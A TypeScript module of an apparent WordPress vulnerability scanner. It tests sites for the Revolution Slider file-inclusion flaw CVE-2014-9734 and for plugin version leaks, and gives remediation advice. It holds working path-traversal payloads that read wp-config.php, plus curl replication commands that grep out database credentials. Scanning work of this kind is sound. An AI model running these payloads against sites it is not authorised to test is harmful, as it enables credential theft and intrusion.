import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'Revolution Slider';

const LFI_INDICATORS = [
  'DB_NAME', 'DB_PASSWORD', 'DB_HOST', 'DB_USER',
  'define(', '<?php', 'table_prefix', 'AUTH_KEY',
  'root:', 'nobody:', '/bin/bash',
];

const LFI_TESTS: [string, string][] = [
  ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',       'LFI via direct traversal'],
  ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=..%2fwp-config.php',    'LFI via URL-encoded traversal'],
  ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=....//wp-config.php',   'LFI via double-dot bypass'],
  ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=..%252fwp-config.php',  'LFI via double-encoded traversal'],
];

const INFO_TESTS: [string, string[], string][] = [
  ['/?action=revslider_ajax_action&client_action=update_captions', ['version', 'slider', 'alias'], 'Info leak via update_captions'],
  ['/wp-content/plugins/revslider/admin/views/templates/update-notice.php', ['revslider', 'version', 'slider'], 'Update notice template exposed'],
  ['/wp-content/plugins/revslider/readme.txt', ['Stable tag:', 'Version:', 'Changelog'], 'Plugin readme.txt version disclosure'],
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  // Phase 1: LFI tests
  await parallelProbe(LFI_TESTS, async ([path, label]) => {
    const url = `${target}${path}`;
    try {
      const res = await fetchURL(url);
      if (!res) return;
      const body = await res.text();
      const indicator = LFI_INDICATORS.find(ind => body.includes(ind));
      if (res.status === 200 && indicator) {
        findings.push(finding('revslider_lfi', 'CRITICAL', url,
          `Revolution Slider LFI confirmed via '${label}'. ` +
          `Sensitive indicator '${indicator}' found in response. ` +
          'wp-config.php contents may be fully exposed.',
          {
            replication_steps: [
              `curl -s "${url}"`,
              `# Look for '${indicator}' in the response.`,
              '# To read full wp-config.php:',
              `curl -s "${target}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"`,
              '# Extract credentials:',
              `curl -s "${url}" | grep -E "DB_NAME|DB_PASSWORD|DB_HOST|DB_USER"`,
            ],
            remediation:
              'Update Revolution Slider to version 4.2+ immediately. ' +
              'Restrict wp-admin/admin-ajax.php access. ' +
              'Move wp-config.php one directory above web root.',
            evidence: JSON.stringify({ indicator, cvss_score: 9.8, cve_refs: ['CVE-2014-9734'] }),
          },
        ));
      }
    } catch (e) {
      errors.push(String(e));
    }
  });

  // Phase 2: Information disclosure
  for (const [path, indicators, label] of INFO_TESTS) {
    const url = `${target}${path}`;
    try {
      const res = await fetchURL(url);
      if (!res || res.status !== 200) continue;
      const body = await res.text();
      const bodyLower = body.toLowerCase();
      const hit = indicators.find(ind => bodyLower.includes(ind.toLowerCase()));
      if (hit) {
        let version = '';
        for (const line of body.split('\n')) {
          if (line.toLowerCase().includes('stable tag') || line.toLowerCase().includes('version')) {
            version = line.trim();
            break;
          }
        }
        findings.push(finding('revslider_info_disclosure', 'MEDIUM', url,
          `Revolution Slider information disclosure via '${label}'. ` +
          (version ? `Version info: '${version}'.` : ''),
          {
            replication_steps: [
              `curl -s "${url}"`,
              '# Observe plugin version/configuration data.',
              '# Cross-reference version at: https://wpscan.com/plugins/revslider',
            ],
            remediation:
              'Remove or restrict access to plugin readme.txt and admin templates. ' +
              'Keep Revolution Slider updated.',
            evidence: JSON.stringify({
              indicator: hit,
              version,
              cvss_score: 5.3,
              cve_refs: ['CVE-2014-9734'],
            }),
          },
        ));
      }
    } catch (e) {
      errors.push(String(e));
    }
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
